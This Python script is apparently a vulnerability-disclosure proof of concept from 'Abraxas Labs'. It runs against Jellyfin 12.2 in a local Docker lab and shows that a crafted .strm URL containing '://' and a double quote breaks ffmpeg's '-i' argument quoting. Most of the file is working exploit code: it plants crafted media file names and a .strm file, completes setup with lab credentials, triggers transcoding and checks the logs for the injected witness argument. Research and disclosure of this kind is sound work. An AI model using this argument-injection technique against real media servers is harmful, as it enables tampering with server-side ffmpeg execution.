#!/usr/bin/env python3
######################################################################################
#
#        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.
#       d88888 888  "88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b
#      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.
#     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  "Y888b.
#    d88P  888 888  "Y88b 8888888P"     d88P  888    d888b       d88P  888     "Y88b.
#   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       "888
#  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P
# d88P     888 8888888P"  888   T88b d88P     888 d88P   Y88b d88P     888  "Y8888P"
#
#                     888             d8888 888888b.    .d8888b.
#                     888            d88888 888  "88b  d88P  Y88b
#                     888           d88P888 888  .88P  Y88b.
#                     888          d88P 888 8888888K.   "Y888b.
#                     888         d88P  888 888  "Y88b     "Y88b.
#                     888        d88P   888 888    888       "888
#                     888       d8888888888 888   d88P Y88b  d88P
#                     88888888 d88P     888 8888888P"   "Y8888P"
#
#  Website : https://abraxaslabs.tech
#  GitHub  : https://github.com/abraxas
#  Twitter : @abraxas_null
#  Mail    : abraxas.null@proton.me
#
#  CVE: jellyfin-ffmpeg-colonslash (High: 7.1)
#  Vendor: Jellyfin Server (Jellyfin)
#  Versions: Jellyfin Server 12.2 (ca0f16eb)
#  Impact: library .strm URL quotes still split ffmpeg -i leftover of GHSA-wwwm
#  Requires: Docker, jellyfin/jellyfin:12.2, loopback 127.0.0.1:18810
#
######################################################################################
#
#  RESEARCH / EDUCATIONAL USE ONLY.
#  Do not run, deploy, or use this material against any host unless you have
#  explicit written permission from both the party hosting this repository
#  and the owner of the target systems.
#
######################################################################################

import os as _os
import shutil as _shutil
import sys as _sys
import builtins as _builtins

_ART = {"abraxas": ["        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.", "       d88888 888  \"88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b", "      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.", "     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  \"Y888b.", "    d88P  888 888  \"Y88b 8888888P\"     d88P  888    d888b       d88P  888     \"Y88b.", "   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       \"888", "  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P", " d88P     888 8888888P\"  888   T88b d88P     888 d88P   Y88b d88P     888  \"Y8888P\""], "labs": ["                     888             d8888 888888b.    .d8888b.", "                     888            d88888 888  \"88b  d88P  Y88b", "                     888           d88P888 888  .88P  Y88b.", "                     888          d88P 888 8888888K.   \"Y888b.", "                     888         d88P  888 888  \"Y88b     \"Y88b.", "                     888        d88P   888 888    888       \"888", "                     888       d8888888888 888   d88P Y88b  d88P", "                     88888888 d88P     888 8888888P\"   \"Y8888P\""]}
_CVE = "jellyfin-ffmpeg-colonslash"
_SITE = "https://abraxaslabs.tech"
_GH = "https://github.com/abraxas"
_XURL = "https://x.com/abraxas_null"
_XH = "@abraxas_null"
_EMAIL = "abraxas.null@proton.me"
_RST = "\033[0m"
_BLD = "\033[1m"


def _on():
    return not _os.environ.get("NO_COLOR")


def _rgb(r, g, b):
    return f"\033[38;2;{r};{g};{b}m" if _on() else ""


_RAIN = [
    (255, 77, 224), (255, 0, 212), (191, 95, 255), (91, 140, 255),
    (0, 210, 255), (0, 255, 249), (57, 255, 20), (180, 255, 70),
    (255, 230, 0), (255, 201, 70), (255, 122, 24), (255, 64, 96),
]


def _lerp(a, b, t):
    return tuple(int(a[i] + (b[i] - a[i]) * t) for i in range(3))


def _rain(x, width):
    if width <= 1:
        return _RAIN[0]
    t = (x / (width - 1)) * (len(_RAIN) - 1)
    i = min(int(t), len(_RAIN) - 2)
    return _lerp(_RAIN[i], _RAIN[i + 1], t - i)


def _logo_line(line, y, n):
    width = max(len(line), 1)
    out = []
    q = False
    for x, ch in enumerate(line):
        if ch == " ":
            out.append(ch)
            continue
        if ch == '"':
            q = not q
            out.append(_rgb(*(255, 201, 70) if q else (255, 230, 0)) + ch)
            continue
        if q:
            out.append(_rgb(255, 230, 0) + ch)
            continue
        r, g, b = _rain(x, width)
        out.append(_rgb(r, g, b) + ch)
    return "".join(out) + _RST


def print_abraxas_banner():
    cols = _shutil.get_terminal_size((120, 30)).columns
    art = _ART["abraxas"] + _ART["labs"]
    art_w = max(len(x) for x in art)
    content_w = min(max(art_w, 88), max(cols - 4, 40))
    box_w = content_w + 4
    if box_w > cols:
        content_w = max(cols - 4, 20)
        box_w = content_w + 4
    cyan, mag = _rgb(0, 255, 249), _rgb(255, 0, 212)
    top = cyan + "╔" + "═" * (box_w - 2) + "╗" + _RST
    mid = mag + "╠" + "═" * (box_w - 2) + "╣" + _RST
    bot = cyan + "╚" + "═" * (box_w - 2) + "╝" + _RST

    def row(vis, rendered, border):
        return _rgb(*border) + "║" + _RST + " " + rendered + _RST + " " + _rgb(*border) + "║" + _RST

    lines = [top]
    title_l, title_r = " ABRAXAS LABS", "analyze · reverse · disclose"
    gap = max(content_w - len(title_l) - len(title_r), 1)
    title = (title_l + " " * gap + title_r)[:content_w].ljust(content_w)
    cells = []
    split, rstart = len(title_l), content_w - len(title_r)
    for i, ch in enumerate(title):
        if ch == " ":
            cells.append(ch)
        elif i < split:
            cells.append(_rgb(0, 255, 249) + _BLD + ch)
        elif i >= rstart:
            cells.append(_rgb(140, 155, 175) + ch)
        else:
            cells.append(ch)
    lines.append(row(title, "".join(cells) + _RST, (0, 255, 249)))
    lines.append(mid)
    cve_l = " " + _CVE
    cve_r = "authorized research only"
    rest = max(content_w - len(cve_l) - len(cve_r), 3)
    midtxt = " local lab ".center(rest)[:rest]
    cve_line = (cve_l + midtxt + cve_r)[:content_w].ljust(content_w)
    cells = []
    le, rs = len(cve_l), content_w - len(cve_r)
    for i, ch in enumerate(cve_line):
        if ch == " ":
            cells.append(ch)
        elif i < le:
            cells.append(_rgb(255, 77, 224) + _BLD + ch)
        elif i >= rs:
            cells.append(_rgb(57, 255, 20) + ch)
        else:
            cells.append(_rgb(255, 0, 212) + ch)
    lines.append(row(cve_line, "".join(cells) + _RST, (255, 0, 212)))
    lines.append(mid)
    n = len(_ART["abraxas"])
    for y, line in enumerate(_ART["abraxas"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    for y, line in enumerate(_ART["labs"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    lines.append(mid)
    for left, right in (("Website", _SITE), ("GitHub", _GH), ("X", _XH + "  " + _XURL), ("Mail", _EMAIL)):
        gap = max(content_w - 1 - len(left) - len(right), 1)
        vis = (" " + left + " " * gap + right)[:content_w].ljust(content_w)
        out = []
        left_end = 1 + len(left)
        right_start = content_w - len(right)
        for i, ch in enumerate(vis):
            if ch == " ":
                out.append(ch)
            elif i < left_end:
                out.append(_rgb(255, 230, 0) + ch)
            elif i >= right_start:
                out.append(_rgb(0, 255, 249) + ch)
            else:
                out.append(ch)
        lines.append(row(vis, "".join(out) + _RST, (255, 0, 212)))
    lines.append(bot)
    status = "[*]  abraxas!null ready on #labs   ·   " + _SITE
    scol = []
    for ch in status:
        if ch == " ":
            scol.append(ch)
        elif ch in "[]*":
            scol.append(_rgb(57, 255, 20) + ch)
        elif ch in "·#":
            scol.append(_rgb(255, 77, 224) + ch)
        else:
            scol.append(_rgb(232, 255, 248) + ch)
    lines.append(" " + "".join(scol) + _RST)
    _sys.stdout.write("\n".join(lines) + "\n\n")
    _sys.stdout.flush()


def _cprint(*args, **kwargs):
    sep = kwargs.get("sep", " ")
    s = sep.join(str(a) for a in args)
    low = s.lower()
    if s.startswith("SUCCESS") or "success" == low[:7]:
        col = _rgb(57, 255, 20) + _BLD
    elif s.startswith("FAIL") or low.startswith("fail"):
        col = _rgb(255, 64, 96) + _BLD
    elif "user_id" in low:
        col = _rgb(255, 201, 70) + _BLD
    elif low.startswith("status=") or "status=" in low[:20]:
        col = _rgb(0, 255, 249)
    elif low.startswith("carrier"):
        col = _rgb(255, 0, 212)
    elif s.lstrip().startswith("{") or s.lstrip().startswith("["):
        col = _rgb(255, 230, 0)
    else:
        col = _rgb(232, 255, 248)
    kwargs = dict(kwargs)
    file = kwargs.get("file", _sys.stdout)
    if file is _sys.stdout or file is _sys.stderr:
        _builtins.print(col + s + _RST, **{k: v for k, v in kwargs.items() if k != "sep"})
    else:
        _builtins.print(*args, **kwargs)


print_abraxas_banner()
_builtins.print = _cprint

"""Prove Jellyfin 12.2 EncodingUtils -i leftover of GHSA-wwwm (:// quote skip)."""

import json
import os
import subprocess
import time
import urllib.error
import urllib.parse
import urllib.request
from dataclasses import dataclass
from pathlib import Path
from typing import Any

LABEL = "jellyfin-ffmpeg-colonslash"
WITNESS = "JELLYFIN-FFMPEG-COLONSLASH-WITNESS"
HOST = "127.0.0.1"
PORT = 18810
BASE = f"http://{HOST}:{PORT}"
COMPOSE = os.environ.get("COMPOSE_PROJECT_NAME", LABEL)
HERE = Path(__file__).resolve().parent
SERVICE = "jellyfin"
ADMIN_USER = "labadmin"
ADMIN_PASS = "LabAdmin1!"
CLIENT = "lab"
DEVICE = "lab"
DEVICE_ID = "lab-ffmpeg"
VERSION = "12.2.0"
MEDIA_DIR = "/media/movies"
CONTROL_NAME = "LabControl.mkv"
STRM_NAME = "LabPlant.strm"
# Filename plant a://b"..." is dir "a:" + file b"..." because "/" is a separator.
# That canonical Path has no "://", so it hits the escaped file: -i branch (GHSA-wwwm).
# Reachable leftover: .strm whose URL contains :// and " (Uri.TryCreate accepts the quote).
PLANT_NAME = f'a://b" {WITNESS} "x.mkv'
PLANT_PARENT = f"{MEDIA_DIR}/a:"
STRM_URL = f'http://127.0.0.1/a" {WITNESS} "x'
TINY_MKV = "/tmp/tiny.mkv"
WITNESS_FILE = f"/media/{WITNESS}"
AUTH_HEADER_BASE = (
    f'MediaBrowser Client="{CLIENT}", Device="{DEVICE}", '
    f'DeviceId="{DEVICE_ID}", Version="{VERSION}"'
)


@dataclass(frozen=True)
class HttpResult:
    status: int
    body: str
    json: Any


def log(msg: str) -> None:
    print(msg, flush=True)


def fail(reason: str) -> int:
    log(f"FAIL {LABEL} {reason} {WITNESS}")
    return 1


def clip(text: str, limit: int = 280) -> str:
    compact = " ".join(text.split())
    if len(compact) > limit:
        return compact[:limit] + "..."
    return compact


def compose(*args: str, timeout: int = 120) -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        ["docker", "compose", "-p", COMPOSE, *args],
        cwd=HERE,
        text=True,
        capture_output=True,
        timeout=timeout,
        check=False,
    )


def compose_exec(*args: str, timeout: int = 120) -> subprocess.CompletedProcess[str]:
    return compose("exec", "-T", SERVICE, *args, timeout=timeout)


def compose_exec_stdin(*args: str, data: str, timeout: int = 60) -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        ["docker", "compose", "-p", COMPOSE, "exec", "-T", SERVICE, *args],
        cwd=HERE,
        input=data,
        text=True,
        capture_output=True,
        timeout=timeout,
        check=False,
    )


def auth_header(token: str | None) -> str:
    if token:
        return f"{AUTH_HEADER_BASE}, Token=\"{token}\""
    return AUTH_HEADER_BASE


def http(
    method: str,
    path: str,
    payload: dict[str, Any] | None = None,
    token: str | None = None,
    timeout: float = 30.0,
    send_auth: bool = True,
    query: dict[str, str] | None = None,
) -> HttpResult:
    url = path if path.startswith("http") else f"{BASE}{path}"
    if query:
        url = url + "?" + urllib.parse.urlencode(query)
    headers: dict[str, str] = {"Accept": "application/json"}
    if send_auth:
        headers["Authorization"] = auth_header(token)
    data: bytes | None = None
    if payload is not None:
        data = json.dumps(payload).encode("utf-8")
        headers["Content-Type"] = "application/json"
    req = urllib.request.Request(url, data=data, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            raw = resp.read()
            body = raw.decode("utf-8", "replace")
            parsed: Any = None
            if body:
                try:
                    parsed = json.loads(body)
                except json.JSONDecodeError:
                    parsed = None
            return HttpResult(int(resp.status), body, parsed)
    except urllib.error.HTTPError as exc:
        raw = exc.read()
        body = raw.decode("utf-8", "replace")
        parsed = None
        if body:
            try:
                parsed = json.loads(body)
            except json.JSONDecodeError:
                parsed = None
        return HttpResult(int(exc.code), body, parsed)
    except (urllib.error.URLError, TimeoutError, OSError) as exc:
        return HttpResult(0, str(exc), None)


def jellyfin_logs() -> str:
    proc = compose("logs", "--no-color", SERVICE, timeout=60)
    return (proc.stdout or "") + "\n" + (proc.stderr or "")


def wait_ready(timeout_s: float = 180.0) -> bool:
    deadline = time.time() + timeout_s
    while time.time() < deadline:
        result = http("GET", "/Startup/User", timeout=5.0, send_auth=False)
        if result.status == 200:
            return True
        log(f"ioc wait-startup status={result.status} body={clip(result.body, 120)}")
        time.sleep(2)
    return False


def resolve_ffmpeg() -> str:
    proc = compose_exec(
        "sh",
        "-c",
        "if [ -x /usr/lib/jellyfin-ffmpeg/ffmpeg ]; then "
        "echo /usr/lib/jellyfin-ffmpeg/ffmpeg; "
        "elif command -v ffmpeg >/dev/null 2>&1; then command -v ffmpeg; "
        "else echo ffmpeg; fi",
        timeout=30,
    )
    text = (proc.stdout or "").strip()
    return text.splitlines()[-1] if text else "ffmpeg"


def plant_media() -> tuple[bool, str]:
    mkdir = compose_exec("mkdir", "-p", "--", PLANT_PARENT, timeout=30)
    if mkdir.returncode != 0:
        return False, f"mkdir-failed rc={mkdir.returncode} {clip(mkdir.stderr or mkdir.stdout or '')}"

    ffmpeg = resolve_ffmpeg()
    log(f"ioc ffmpeg-bin={ffmpeg}")
    encode = compose_exec(
        ffmpeg,
        "-hide_banner",
        "-y",
        "-f",
        "lavfi",
        "-i",
        "color=c=black:s=32x32:d=1:r=1",
        "-c:v",
        "libx264",
        "-pix_fmt",
        "yuv420p",
        "-t",
        "1",
        TINY_MKV,
        timeout=60,
    )
    if encode.returncode != 0:
        encode = compose_exec(
            ffmpeg,
            "-hide_banner",
            "-y",
            "-f",
            "lavfi",
            "-i",
            "color=c=black:s=32x32:d=1:r=1",
            "-c:v",
            "mpeg4",
            "-t",
            "1",
            TINY_MKV,
            timeout=60,
        )
    if encode.returncode != 0:
        err = clip((encode.stderr or "") + (encode.stdout or ""))
        return False, f"mkv-encode-failed rc={encode.returncode} {err}"

    control_path = f"{MEDIA_DIR}/{CONTROL_NAME}"
    plant_path = f"{MEDIA_DIR}/{PLANT_NAME}"
    copied = compose_exec("cp", "--", TINY_MKV, control_path, timeout=30)
    if copied.returncode != 0:
        return False, f"control-copy-failed rc={copied.returncode} {clip(copied.stderr or '')}"
    planted = compose_exec("cp", "--", TINY_MKV, plant_path, timeout=30)
    if planted.returncode != 0:
        return False, f"plant-copy-failed rc={planted.returncode} {clip(planted.stderr or '')}"
    witness = compose_exec(
        "sh",
        "-c",
        f"printf '%s\\n' '{WITNESS}' > '{WITNESS_FILE}'",
        timeout=30,
    )
    if witness.returncode != 0:
        return False, f"witness-file-failed rc={witness.returncode}"
    strm = compose_exec_stdin(
        "tee",
        f"{MEDIA_DIR}/{STRM_NAME}",
        data=STRM_URL + "\n",
        timeout=30,
    )
    if strm.returncode != 0:
        return False, f"strm-write-failed rc={strm.returncode} {clip(strm.stderr or '')}"
    log(f"ioc strm-url={STRM_URL!r}")
    listed = compose_exec(
        "sh",
        "-c",
        "ls -1b /media/movies; echo '---'; ls -1b /media/movies/a:; echo '---'; "
        "find /media/movies -print | cat -v",
        timeout=30,
    )
    listing = (listed.stdout or "").strip()
    log(f"ioc media-ls={clip(listing, 600)}")
    if CONTROL_NAME not in listing:
        return False, "control-missing-in-ls"
    if STRM_NAME not in listing:
        return False, f"strm-missing-in-ls listing={clip(listing, 400)}"
    if WITNESS not in listing:
        return False, f"plant-missing-in-ls listing={clip(listing, 400)}"
    return True, listing


def wizard() -> int | None:
    first = http("GET", "/Startup/User", send_auth=False, timeout=20)
    log(f"ioc GET /Startup/User status={first.status} body={clip(first.body)}")
    if first.status != 200:
        return fail(f"startup-user-get status={first.status} {clip(first.body)}")

    created = http(
        "POST",
        "/Startup/User",
        payload={"Name": ADMIN_USER, "Password": ADMIN_PASS},
        send_auth=False,
        timeout=20,
    )
    log(f"ioc POST /Startup/User status={created.status} body={clip(created.body)}")
    if created.status not in (200, 204):
        return fail(f"startup-user-post status={created.status} {clip(created.body)}")

    remote = http(
        "POST",
        "/Startup/RemoteAccess",
        payload={"EnableRemoteAccess": True},
        send_auth=False,
        timeout=20,
    )
    log(f"ioc POST /Startup/RemoteAccess status={remote.status} body={clip(remote.body)}")
    if remote.status not in (200, 204):
        return fail(f"remote-access status={remote.status} {clip(remote.body)}")

    folder = http(
        "POST",
        "/Library/VirtualFolders",
        payload={"LibraryOptions": {}},
        send_auth=False,
        timeout=60,
        query={
            "name": "Movies",
            "collectionType": "movies",
            "paths": MEDIA_DIR,
            "refreshLibrary": "false",
        },
    )
    log(f"ioc POST /Library/VirtualFolders status={folder.status} body={clip(folder.body)}")
    if folder.status not in (200, 204):
        return fail(f"virtual-folder status={folder.status} {clip(folder.body)}")

    complete = http("POST", "/Startup/Complete", payload={}, send_auth=False, timeout=20)
    log(f"ioc POST /Startup/Complete status={complete.status} body={clip(complete.body)}")
    if complete.status not in (200, 204):
        return fail(f"startup-complete status={complete.status} {clip(complete.body)}")
    return None


def authenticate() -> tuple[str, str] | int:
    result = http(
        "POST",
        "/Users/AuthenticateByName",
        payload={"Username": ADMIN_USER, "Pw": ADMIN_PASS},
        send_auth=True,
        token=None,
        timeout=20,
    )
    log(f"ioc POST /Users/AuthenticateByName status={result.status} body={clip(result.body)}")
    if result.status != 200 or not isinstance(result.json, dict):
        return fail(f"auth status={result.status} {clip(result.body)}")
    token = result.json.get("AccessToken") or result.json.get("accessToken")
    user = result.json.get("User") or result.json.get("user") or {}
    user_id = ""
    if isinstance(user, dict):
        user_id = str(user.get("Id") or user.get("id") or "")
    if not token or not user_id:
        return fail(f"auth-missing-token-or-user json={clip(result.body)}")
    return str(token), user_id


def refresh_library(token: str) -> int | None:
    result = http("POST", "/Library/Refresh", token=token, payload={}, timeout=180)
    log(f"ioc POST /Library/Refresh status={result.status} body={clip(result.body)}")
    if result.status not in (200, 204):
        return fail(f"library-refresh status={result.status} {clip(result.body)}")
    return None


def item_path(item: dict[str, Any]) -> str:
    return str(item.get("Path") or item.get("path") or "")


def item_id(item: dict[str, Any]) -> str:
    return str(item.get("Id") or item.get("id") or "")


def list_items(token: str, user_id: str) -> list[dict[str, Any]]:
    result = http(
        "GET",
        "/Items",
        token=token,
        timeout=30,
        query={
            "userId": user_id,
            "recursive": "true",
            "fields": "Path,MediaSources",
            "includeItemTypes": "Movie,Video",
            "limit": "100",
        },
    )
    log(f"ioc GET /Items status={result.status} body={clip(result.body, 500)}")
    if result.status != 200 or not isinstance(result.json, dict):
        return []
    items = result.json.get("Items") or result.json.get("items") or []
    if isinstance(items, list):
        return [i for i in items if isinstance(i, dict)]
    return []


def wait_items(token: str, user_id: str, timeout_s: float = 90.0) -> tuple[str | None, str | None, list[dict[str, Any]]]:
    deadline = time.time() + timeout_s
    last: list[dict[str, Any]] = []
    while time.time() < deadline:
        items = list_items(token, user_id)
        last = items
        control_id = None
        plant_id = None
        for item in items:
            path = item_path(item)
            iid = item_id(item)
            log(f"ioc item id={iid} path={path!r} name={item.get('Name') or item.get('name')!r}")
            if path.endswith(CONTROL_NAME) or CONTROL_NAME in path:
                control_id = iid
            if path.endswith(STRM_NAME) or STRM_NAME in path:
                plant_id = iid
            elif WITNESS in path and CONTROL_NAME not in path and plant_id is None:
                plant_id = iid
        if control_id and plant_id:
            return control_id, plant_id, items
        time.sleep(3)
    control_id = None
    plant_id = None
    for item in last:
        path = item_path(item)
        iid = item_id(item)
        if path.endswith(CONTROL_NAME) or CONTROL_NAME in path:
            control_id = iid
        if path.endswith(STRM_NAME) or STRM_NAME in path:
            plant_id = iid
        elif WITNESS in path and CONTROL_NAME not in path and plant_id is None:
            plant_id = iid
    return control_id, plant_id, last


def trigger_stream(item: str, timeout_s: float) -> HttpResult:
    path = f"/Videos/{item}/stream.ts"
    return http(
        "GET",
        path,
        send_auth=False,
        timeout=timeout_s,
        query={
            "videoCodec": "h264",
            "audioCodec": "aac",
            "maxWidth": "64",
        },
    )


def ffmpeg_lines(log_text: str) -> list[str]:
    return [line for line in log_text.splitlines() if "-i " in line]


def plant_quote_split(log_text: str) -> tuple[bool, bool, str]:
    """Return (saw_plant_cmd, argv_split, evidence)."""
    saw = False
    last_escaped = ""
    for line in ffmpeg_lines(log_text) or log_text.splitlines():
        if WITNESS not in line:
            continue
        if CONTROL_NAME in line:
            continue
        if "-i " not in line and "ffmpeg" not in line.lower() and "http://" not in line:
            continue
        saw = True
        evidence = clip(line, 500)
        escaped = f'\\" {WITNESS} \\"' in line or f'\\"{WITNESS}\\"' in line
        url_split = f'http://127.0.0.1/a" {WITNESS}' in line
        if url_split and not escaped:
            return True, True, evidence
        split = (f'" {WITNESS} "' in line or f'" {WITNESS} ' in line) and not escaped
        if split:
            return True, True, evidence
        if escaped:
            last_escaped = evidence
            continue
        i_idx = line.find("-i ")
        if i_idx != -1:
            after = line[i_idx:]
            first_q = after.find('"')
            if first_q != -1:
                close_q = after.find('"', first_q + 1)
                if close_q != -1 and WITNESS in after[close_q + 1 :]:
                    return True, True, evidence
    if last_escaped:
        return True, False, last_escaped
    return saw, False, ""


def control_has_witness_arg(log_text: str) -> tuple[bool, bool, str]:
    """Return (saw_control_cmd, witness_as_extra_arg, evidence)."""
    for line in ffmpeg_lines(log_text) or log_text.splitlines():
        if CONTROL_NAME not in line or "-i " not in line:
            continue
        evidence = clip(line, 500)
        extra = f" {WITNESS} " in line or line.rstrip().endswith(WITNESS)
        return True, extra, evidence
    return False, False, ""


def main() -> int:
    log(f"ioc start label={LABEL} base={BASE} compose={COMPOSE}")
    if not wait_ready():
        log(clip(jellyfin_logs(), 800))
        return fail("jellyfin-not-ready")

    ok, detail = plant_media()
    if not ok:
        return fail(detail)
    log(f"ioc plant-ok {detail}")

    wizard_rc = wizard()
    if wizard_rc is not None:
        return wizard_rc

    auth = authenticate()
    if isinstance(auth, int):
        return auth
    token, user_id = auth
    log(f"ioc auth userId={user_id}")

    refresh_rc = refresh_library(token)
    if refresh_rc is not None:
        return refresh_rc

    control_id, plant_id, items = wait_items(token, user_id)
    log(f"ioc items n={len(items)} control={control_id} plant={plant_id}")
    if not control_id:
        return fail("control-item-missing")
    if not plant_id:
        logs = jellyfin_logs()
        log(f"ioc resolver-skip-logs {clip(logs, 800)}")
        return fail("resolver-skipped-plant ffprobe-or-scan-dropped-://-filename")

    control_stream = trigger_stream(control_id, timeout_s=25.0)
    log(f"ioc control-stream status={control_stream.status} bytes={len(control_stream.body)}")
    time.sleep(2)
    plant_stream = trigger_stream(plant_id, timeout_s=20.0)
    log(
        f"ioc plant-stream status={plant_stream.status} bytes={len(plant_stream.body)} "
        f"body={clip(plant_stream.body)}"
    )
    time.sleep(2)

    logs = jellyfin_logs()
    log(f"ioc logs-bytes={len(logs)}")
    for line in ffmpeg_lines(logs):
        if CONTROL_NAME in line or "a://b" in line or WITNESS in line:
            log(f"ioc ffmpeg-line {clip(line, 500)}")

    saw_plant, split, plant_ev = plant_quote_split(logs)
    saw_control, control_extra, control_ev = control_has_witness_arg(logs)
    log(f"ioc plant saw={saw_plant} argv-split={split} ev={plant_ev}")
    log(f"ioc control saw={saw_control} witness-extra={control_extra} ev={control_ev}")

    if not saw_plant:
        return fail("no-ffmpeg-log-for-plant")
    if not split:
        return fail(f"argv-split=no still-quoted ev={plant_ev}")
    if saw_control and control_extra:
        return fail(f"control-witness-leaked ev={control_ev}")
    if not saw_control:
        log("ioc control-ffmpeg-log-missing (stream may have 500'd); plant split still holds")

    log(
        f"SUCCESS {LABEL} argv-split=yes plant-i=quote-break "
        f"control-id={control_id} plant-id={plant_id} {WITNESS}"
    )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())

